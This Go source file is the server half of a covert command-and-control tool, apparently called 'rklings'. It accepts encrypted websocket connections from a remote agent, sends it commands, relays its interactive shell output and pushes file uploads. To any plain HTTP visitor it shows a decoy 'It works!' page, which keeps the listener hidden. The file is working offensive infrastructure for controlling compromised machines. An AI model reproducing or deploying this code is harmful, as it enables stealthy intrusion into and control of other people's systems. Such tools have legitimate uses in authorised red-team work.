package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
)

// --- Crypto (same as agent) ---

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

// --- Wire types ---

type agentCmd struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

// --- Agent session ---

type agentSession struct {
	id      string
	conn    *websocket.Conn
	key     [32]byte
	writeMu sync.Mutex
	cmdMu   sync.Mutex
	respCh  chan json.RawMessage
	ptyMu   sync.RWMutex
	ptySub  chan []byte
	done    chan struct{}
}

var agent struct {
	sync.Mutex
	id       string
	key      [32]byte
	agentPub []byte
	session  *agentSession
}

const decoyHTML = `<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1><p>The server is running.</p></body></html>`

func main() {
	pkiDir := os.Getenv("RKLINGS_PKI_DIR")
	if pkiDir == "" {
		fmt.Fprintln(os.Stderr, "RKLINGS_PKI_DIR is required")
		os.Exit(1)
	}

	operatorKey, err := os.ReadFile(filepath.Join(pkiDir, "operator.key"))
	if err != nil {
		log.Fatalf("read operator key: %v", err)
	}
	agentPub, err := os.ReadFile(filepath.Join(pkiDir, "agent.pub"))
	if err != nil {
		log.Fatalf("read agent pub: %v", err)
	}

	key, id, err := deriveKeys(operatorKey, agentPub)
	if err != nil {
		log.Fatalf("derive keys: %v", err)
	}

	agent.key = key
	agent.id = hex.EncodeToString(id[:])
	agent.agentPub = agentPub

	addr := envOr("RKLINGS_LISTEN_ADDR", ":8443")

	go startWeb()
	if os.Getenv("RKLINGS_NO_TUI") != "1" {
		go startTUI()
	}

	fmt.Printf("[*] Listening on %s for agent connections\n", addr)
	fmt.Printf("[*] Expected agent ID: %s\n", agent.id)
	webAddr := envOr("RKLINGS_WEB_ADDR", "127.0.0.1:8080")
	fmt.Printf("[*] Webapp on http://%s\n", webAddr)

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleAgent)
	log.Fatal(http.ListenAndServe(addr, mux))
}

func handleAgent(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("Upgrade") != "" {
		handleAgentWS(w, r)
		return
	}
	serveDecoy(w)
}

func handleAgentWS(w http.ResponseWriter, r *http.Request) {
	conn, err := websocket.Accept(w, r, nil)
	if err != nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	_, msg, err := conn.Read(ctx)
	cancel()
	if err != nil || len(msg) < 32+12+16 {
		conn.CloseNow()
		return
	}

	if !bytes.Equal(msg[:32], agent.agentPub) {
		conn.CloseNow()
		return
	}
	if _, err := openAEAD(agent.key, msg[32:]); err != nil {
		conn.CloseNow()
		return
	}

	conn.SetReadLimit(4 << 20)

	s := &agentSession{
		id:     agent.id,
		conn:   conn,
		key:    agent.key,
		respCh: make(chan json.RawMessage, 1),
		done:   make(chan struct{}),
	}

	agent.Lock()
	old := agent.session
	agent.session = s
	agent.Unlock()
	if old != nil && old.conn != nil {
		old.conn.CloseNow()
	}

	recordEvent("connect", "agent connected")

	defer func() {
		agent.Lock()
		if agent.session == s {
			agent.session = nil
		}
		agent.Unlock()
		conn.CloseNow()
		close(s.done)
		recordEvent("disconnect", "agent disconnected")
	}()

	bgCtx := context.Background()
	for {
		_, raw, err := conn.Read(bgCtx)
		if err != nil {
			return
		}
		plain, err := openAEAD(s.key, raw)
		if err != nil {
			continue
		}
		var frame struct {
			PTY  string          `json:"pty,omitempty"`
			Data json.RawMessage `json:"data,omitempty"`
		}
		if json.Unmarshal(plain, &frame) != nil {
			continue
		}
		if frame.PTY != "" {
			s.ptyMu.RLock()
			sub := s.ptySub
			s.ptyMu.RUnlock()
			if sub != nil {
				data, err := base64.StdEncoding.DecodeString(frame.PTY)
				if err == nil {
					select {
					case sub <- data:
					default:
					}
				}
			}
		} else if frame.Data != nil {
			select {
			case s.respCh <- frame.Data:
			default:
			}
		}
	}
}

func sendCommand(op, arg string, data json.RawMessage) (json.RawMessage, error) {
	agent.Lock()
	s := agent.session
	agent.Unlock()
	if s == nil {
		return nil, fmt.Errorf("no agent connected")
	}

	s.cmdMu.Lock()
	defer s.cmdMu.Unlock()

	cmd, _ := json.Marshal(agentCmd{Op: op, Arg: arg, Data: data})
	ct, err := sealAEAD(s.key, cmd)
	if err != nil {
		return nil, err
	}
	s.writeMu.Lock()
	writeErr := s.conn.Write(context.Background(), websocket.MessageBinary, ct)
	s.writeMu.Unlock()
	if writeErr != nil {
		return nil, writeErr
	}

	select {
	case resp := <-s.respCh:
		return resp, nil
	case <-s.done:
		return nil, fmt.Errorf("agent disconnected")
	case <-time.After(2 * time.Minute):
		return nil, fmt.Errorf("timeout waiting for agent")
	}
}

func sendUploadCommand(path string, rawData []byte) (json.RawMessage, error) {
	payload, _ := json.Marshal(struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}{path, base64.StdEncoding.EncodeToString(rawData)})
	return sendCommand("UPLOAD", "", json.RawMessage(payload))
}

func connected() bool {
	agent.Lock()
	s := agent.session
	agent.Unlock()
	if s == nil {
		return false
	}
	select {
	case <-s.done:
		return false
	default:
		return true
	}
}

func getSession() *agentSession {
	agent.Lock()
	defer agent.Unlock()
	return agent.session
}

func serveDecoy(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	io.WriteString(w, decoyHTML)
}

func rawToString(raw json.RawMessage) string {
	var s string
	if json.Unmarshal(raw, &s) == nil {
		return s
	}
	return string(raw)
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}
